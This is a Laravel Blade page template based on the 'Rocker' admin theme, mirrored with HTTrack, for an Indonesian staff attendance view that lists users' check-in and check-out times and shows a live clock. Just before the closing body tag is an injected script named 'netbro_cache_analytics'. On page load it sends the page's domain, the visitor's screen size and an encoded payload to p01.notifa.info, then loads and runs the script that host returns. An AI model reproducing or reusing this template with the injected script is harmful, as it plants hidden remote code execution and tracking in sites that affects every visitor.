<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/pages-user-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:57 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
  <!--favicon-->
  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
  <!-- simplebar CSS-->
  <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
  
</head>

<body>

<!-- Start wrapper-->

 
   <!--Start sidebar-wrapper-->
  
   <!--End sidebar-wrapper-->

<!--Start topbar header-->
<header class="topbar-nav fixed-top" style="margin-bottom: 50px; position: fixed;">
 <nav class="navbar navbar-expand-lg fixed-top gradient-scooter">
  <ul class="navbar-nav mr-auto align-items-center">
  
  </ul>
     
  <ul class="navbar-nav align-items-center right-nav-link">
    
   
    
 
  </ul>
</nav>
</header>
<!--End topbar header-->

<div class="" >
  
  
     <div class="jumbotron jumbotron-fluid ">
        <div class="container">
             <div class="row pt-2 pb-2">
        <div class="col-sm-9">
        <h4 class="page-title">User Profile</h4>
        <ol class="breadcrumb">
            <li ><h2 style="font-size: 50px; font-family: arial;" id="jam"><h2></li>
            
         </ol>
     </div>
    
     </div>
    <!-- End Breadcrumb-->
      <div class="row">
        
        <div class="col-lg-12">
        
           <div class="card">
            <div class="card-body">




            <div class="row">   
           @foreach($user as $user)
          <div class="col-lg-3">
         <div class="card card-outline-primary">
          <img src="assets/images/gallery/1.jpg" class="card-img-top" alt="Card image cap">
          <div class="card-body">
            <h5 class="card-title text-primary">{{$user->name}}</h5>
            <hr> 
             <p>jam masuk  :  
            @foreach($user->presences as $presence)
            {{substr($presence->created_at,-9)}}  
            @endforeach
            </p>
            <p>jam keluar :
              @foreach($user->presences as $presence)
            {{substr($presence->checkout,-9)}}  
            @endforeach
            </p>
            <hr>  
            <a href="presence/{{$user->id}}" class="btn btn-danger col-12">absen masuk</a> 
     
         
          </div>
        </div>
        </div>
          @endforeach
        </div>







        </div>
      </div>
    
      </div>
        <!-- end row-->
    </div>
            
        </div>
    </div>
    <!-- End container-fluid-->
   
   <!--End content-wrapper-->
   <!--Start Back To Top Button-->
    
    <!--End Back To Top Button-->
  
  <!--Start footer-->
  <footer>
      <div class="container">
        <div class="text-center">
          Copyright © 2018 Rocker Admin
        </div>
      </div>
    </footer>
  <!--End footer-->
   </div>
  <!--End wrapper-->


  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
  
  <!-- simplebar js -->
  <script src="assets/plugins/simplebar/js/simplebar.js"></script>
  <!-- waves effect js -->
  <script src="assets/js/waves.js"></script>
  <!-- sidebar-menu js -->
  <script src="assets/js/sidebar-menu.js"></script>
  <!-- Custom scripts -->
  <script src="assets/js/app-script.js"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujvCsE2ZS0m7POq%2f43%2fey9y0MOgWQD3yjKWjrs4r0br0wbxovjhyaCr0YrZKNdGh%2fumyxUMsZPLSFSjdOr77HFgVHokt1qFZTdvKpiXG8Dj%2bu6mIo%2fE0JJQhlMNZvYfJLGqW45nYGYEU7qxGtq8ZWzuWmzKX9sBhhUhGFWB7fiG3yuu0XG654JtxOlHD1GvvjT1E3QR1UKeQ01fYmxTNXICXAnxQ0M0b%2b6qLcWnjEgQf29VFSwpFsn4lUPfOiw2QPimR6IvMeG9nULan7OdaO3e%2fUTwKLCRjnLmDPx%2fjP9u6UyGdfO4MP8AVL%2bm8whO9uslyfafe7nj7py2x90EFmug6pK59n15cs34SVL7Uaefew6ybgmCnrXYdbcep7d8qQBrONlpKOS5rtI0y8vQ2%2bLGQdIQwBfSTbRuPuAiqjjCqL3mslQbEgExI0%2fX4L2ntZMhnvNZrNBYllLdTcXA%2bccaMpwvB8%2fvlhNZ%2f1UEeCjo5Ud5B%2ftw9NtFyi5kFKYiIPw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/pages-user-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
<script type="text/javascript">
    window.onload = function() { jam(); }
   
    function jam() {
     var e = document.getElementById('jam'),
     d = new Date(), h, m, s;
     h = d.getHours();
     m = set(d.getMinutes());
     s = set(d.getSeconds());
   
     e.innerHTML = h +':'+ m +':'+ s;
   
     setTimeout('jam()', 1000);
    }
   
    function set(e) {
     e = e < 10 ? '0'+ e : e;
     return e;
    }
   </script>




</html>
